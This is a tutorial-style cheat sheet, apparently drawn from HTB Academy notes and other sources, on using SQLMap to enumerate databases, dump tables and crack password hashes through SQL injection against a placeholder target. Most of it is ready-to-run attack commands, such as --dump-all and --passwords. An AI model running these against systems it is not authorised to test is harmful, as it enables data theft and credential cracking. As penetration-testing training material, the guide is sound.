# Database Enumeration with SQLMap

Enumeration is the payoff phase of SQL injection. Once injection is confirmed, SQLMap uses its internal `queries.xml` file to automatically select the correct SQL for each DBMS, switching between inband queries (for UNION/error-based) and blind queries (row-by-row extraction) depending on what the injection type supports. [github](https://github.com/0x1kp/htb-academy-fork/blob/main/SQLMapEssentials.md)

***

## Initial Reconnaissance

Always start with these four flags together to establish the full context before going deeper: [stationx](https://www.stationx.net/sqlmap-cheat-sheet/)

```bash
sqlmap -u "http://target.com/?id=1" \
  --banner --current-user --current-db --is-dba --batch
```

| Flag | Returns | Significance |
|------|---------|-------------|
| `--banner` | MySQL version string | Reveals patch level, older versions have known exploits |
| `--current-user` | `root@%` | Indicates DBA-level access if root |
| `--current-db` | `testdb` | Scopes subsequent enumeration |
| `--is-dba` | True/False | Confirms whether file read/write is viable |

Note that `root@%` in the database context does not mean OS root. It means the MySQL user has no database-level restrictions, but OS-level file system access depends on the `FILE` privilege and `secure_file_priv` settings separately. [github](https://github.com/0x1kp/htb-academy-fork/blob/main/SQLMapEssentials.md)

***

## The Enumeration Sequence

### Step 1: List All Databases

```bash
sqlmap -u "http://target.com/?id=1" --dbs --batch
```

### Step 2: List Tables in Target Database

```bash
sqlmap -u "http://target.com/?id=1" --tables -D testdb --batch
```

Always specify `-D` to avoid retrieving tables from every database simultaneously. [cybersecmastery](https://cybersecmastery.in/blog/dumping-data-in-error-based-scenario)

### Step 3: Dump a Specific Table

```bash
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --batch
```

Output is saved automatically as a CSV file at:
```
~/.local/share/sqlmap/output/target.com/dump/testdb/users.csv
```

Use `--dump-format` to change the output format: [stationx](https://www.stationx.net/sqlmap-cheat-sheet/)

```bash
--dump-format=CSV      # Default
--dump-format=HTML     # Browser-viewable
--dump-format=SQLITE   # For offline SQLite investigation
```

***

## Surgical Extraction Options

For large tables, pulling everything wastes time and generates unnecessary traffic. These flags let you extract precisely what you need: [highon](https://highon.coffee/blog/sqlmap-cheat-sheet/)

```bash
# Specific columns only
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb -C name,surname

# Specific row range (rows 2 through 3 only)
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

# Conditional WHERE clause
sqlmap -u "http://target.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

# Count rows before committing to a full dump
sqlmap -u "http://target.com/?id=1" --count -T users -D testdb
```

The `--where` option is particularly useful when you already know the target value, such as dumping only the admin user's row rather than an entire user table with thousands of entries.

***

## Full Database Dumps

```bash
# Dump entire current database (all tables)
sqlmap -u "http://target.com/?id=1" --dump -D testdb --batch

# Dump everything across all databases
sqlmap -u "http://target.com/?id=1" --dump-all --batch

# Dump everything but skip system databases (recommended)
sqlmap -u "http://target.com/?id=1" --dump-all --exclude-sysdbs --batch
```

`--dump-all` without `--exclude-sysdbs` will attempt to extract `information_schema`, `mysql`, `performance_schema`, and `sys` in their entirety, which adds thousands of rows of irrelevant system data and can put significant load on a constrained server.  Always include `--exclude-sysdbs` unless you have a specific reason to examine system database contents. [cybersecmastery](https://cybersecmastery.in/blog/dumping-data-in-error-based-scenario)

***

## Enumeration Flag Quick Reference

| Flag | Scope | Use |
|------|-------|-----|
| `--dbs` | Server-wide | List all databases |
| `--tables -D db` | Database | List tables |
| `--columns -T tbl -D db` | Table | List columns |
| `--dump -T tbl -D db` | Table | Extract all rows |
| `--dump-all` | Server-wide | Extract everything |
| `--exclude-sysdbs` | Modifier | Skip system databases |
| `-C col1,col2` | Modifier | Restrict to named columns |
| `--start=N --stop=N` | Modifier | Row range restriction |
| `--where="condition"` | Modifier | Filter rows by condition |
| `--count` | Table | Row count without dumping |
| `--schema` | Server-wide | Full schema enumeration |
| `--passwords` | Server-wide | Dump and crack password hashes |
| `-a / --all` | Server-wide | Retrieve absolutely everything |  [stationx](https://www.stationx.net/sqlmap-cheat-sheet/)
